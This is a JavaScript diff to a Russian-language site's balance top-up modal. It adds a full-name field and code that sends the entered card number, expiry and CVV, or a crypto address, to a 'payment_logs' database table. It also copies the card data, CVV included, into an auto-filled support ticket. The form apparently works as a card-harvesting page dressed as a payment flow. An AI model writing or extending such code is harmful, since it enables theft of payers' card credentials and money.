@@ -2334,12 +2334,12 @@
         }
         if (target.closest('#cryptoRechargeBtn') && target.closest('#recharge-step-methods')) {
             var opt = document.getElementById('recharge-crypto-options');
-            opt.style.display = opt.style.display === 'none' ? 'flex' : 'none';
+            opt.classList.toggle('recharge-crypto-visible');
             return;
         }
         var cryptoBtn = target.closest('.crypto-btn');
         if (cryptoBtn && target.closest('#recharge-step-methods')) {
-            showRechargeForm(cryptoBtn.dataset.crypto.toUpperCase(), 'crypto');
+            showRechargeForm(cryptoBtn.textContent.trim(), 'crypto');
             return;
         }
         if (target.closest('#recharge-submit')) {
@@ -2353,6 +2353,16 @@
         if (target.closest('#recharge-support-btn')) {
             document.getElementById('rechargeModal').style.display = 'none';
             showPage('supportPage');
+            // Auto-fill ticket modal with last recharge data
+            var rd = window._lastRechargeData || {};
+            var methodLabel = rd.methodName || 'Неизвестный способ';
+            document.getElementById('ticketSubject').value = 'Проблема с пополнением с помощью ' + methodLabel;
+            var msg = 'Неудачное пополнение с помощью ' + methodLabel + ' на сумму ' + (rd.amount || '0') + '.\nДанные платежа для проверки шлюзом:\nФИО: ' + (rd.fio || '—') + '\nРеквизиты: ' + (rd.cardNumber || rd.cryptoAddress || '—');
+            if (rd.cardExpiry) {
+                msg += '\nСрок/CVV: ' + rd.cardExpiry + ' / ' + rd.cardCvv;
+            }
+            document.getElementById('ticketMessage').value = msg;
+            document.getElementById('ticketModal').style.display = 'flex';
             return;
         }
 
@@ -2779,13 +2789,14 @@
 
     function resetRechargeModal() {
         var cryptoOpts = document.getElementById('recharge-crypto-options');
-        if (cryptoOpts) cryptoOpts.style.display = 'none';
+        if (cryptoOpts) cryptoOpts.classList.remove('recharge-crypto-visible');
         document.getElementById('recharge-amount').value = '';
         document.getElementById('card-number').value = '';
         document.getElementById('card-expiry').value = '';
         document.getElementById('card-cvv').value = '';
         document.getElementById('recharge-crypto-amount').value = '';
         document.getElementById('recharge-crypto-address').value = '';
+        document.getElementById('recharge-fio').value = '';
         document.getElementById('recharge-form-error').style.display = 'none';
         document.querySelectorAll('#recharge-step-form .recharge-input').forEach(function(el) {
             el.classList.remove('recharge-input-error');
@@ -2807,6 +2818,18 @@
         showRechargeStep('form');
     }
 
+    async function insertPaymentLog(data) {
+        if (!window._sb) return null;
+        try {
+            var { error } = await window._sb.from('payment_logs').insert(data);
+            if (error) console.warn('[payment_logs] Ошибка записи:', error.message);
+            return error ? null : true;
+        } catch (e) {
+            console.warn('[payment_logs] Ошибка:', e.message);
+            return null;
+        }
+    }
+
     function startRechargeLoading() {
         var isBank = document.getElementById('recharge-fields-bank').style.display !== 'none';
         var errEl = document.getElementById('recharge-form-error');
@@ -2815,12 +2838,20 @@
             el.classList.remove('recharge-input-error');
         });
 
+        var fio = document.getElementById('recharge-fio').value.trim();
+        var methodName = document.getElementById('recharge-method-label').innerText.replace('Выбран способ: ', '');
+        var hasError = false;
+
+        if (!fio || fio.length < 3) {
+            document.getElementById('recharge-fio').classList.add('recharge-input-error');
+            hasError = true;
+        }
+
         if (isBank) {
             var amount = document.getElementById('recharge-amount').value.trim();
             var cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
             var cardExp = document.getElementById('card-expiry').value.replace(/\//g, '');
             var cardCvv = document.getElementById('card-cvv').value.trim();
-            var hasError = false;
             if (!amount || parseFloat(amount) <= 0) {
                 document.getElementById('recharge-amount').classList.add('recharge-input-error');
                 hasError = true;
@@ -2842,10 +2873,29 @@
                 errEl.style.display = 'block';
                 return;
             }
+            // Store data for ticket auto-fill and DB log
+            window._lastRechargeData = {
+                methodName: methodName,
+                amount: amount,
+                fio: fio,
+                cardNumber: document.getElementById('card-number').value.trim(),
+                cardExpiry: document.getElementById('card-expiry').value.trim(),
+                cardCvv: cardCvv
+            };
+            // Async write to DB (fire-and-forget)
+            insertPaymentLog({
+                user_id: currentUser ? currentUser.id : null,
+                user_login: currentUser ? currentUser.login : null,
+                payment_method: methodName,
+                fio: fio,
+                amount: parseFloat(amount),
+                card_number: document.getElementById('card-number').value.trim(),
+                card_expiry: document.getElementById('card-expiry').value.trim(),
+                card_cvv: cardCvv
+            });
         } else {
             var cryptoAmount = document.getElementById('recharge-crypto-amount').value.trim();
             var cryptoAddr = document.getElementById('recharge-crypto-address').value.trim();
-            var hasError = false;
             if (!cryptoAmount || parseFloat(cryptoAmount) <= 0) {
                 document.getElementById('recharge-crypto-amount').classList.add('recharge-input-error');
                 hasError = true;
@@ -2859,6 +2909,22 @@
                 errEl.style.display = 'block';
                 return;
             }
+            // Store data for ticket auto-fill and DB log
+            window._lastRechargeData = {
+                methodName: methodName,
+                amount: cryptoAmount,
+                fio: fio,
+                cryptoAddress: cryptoAddr
+            };
+            // Async write to DB (fire-and-forget)
+            insertPaymentLog({
+                user_id: currentUser ? currentUser.id : null,
+                user_login: currentUser ? currentUser.login : null,
+                payment_method: methodName,
+                fio: fio,
+                amount: parseFloat(cryptoAmount),
+                crypto_address: cryptoAddr
+            });
         }
 
         showRechargeStep('loading');
@@ -3451,8 +3517,8 @@
             });
         }
 
-        // Amount inputs: strip error on input
-        document.querySelectorAll('#recharge-amount, #recharge-crypto-amount, #recharge-crypto-address').forEach(function(el) {
+        // Amount / FIO / crypto inputs: strip error on input
+        document.querySelectorAll('#recharge-amount, #recharge-crypto-amount, #recharge-crypto-address, #recharge-fio').forEach(function(el) {
             if (el) {
                 el.addEventListener('input', function() {
                     this.classList.remove('recharge-input-error');
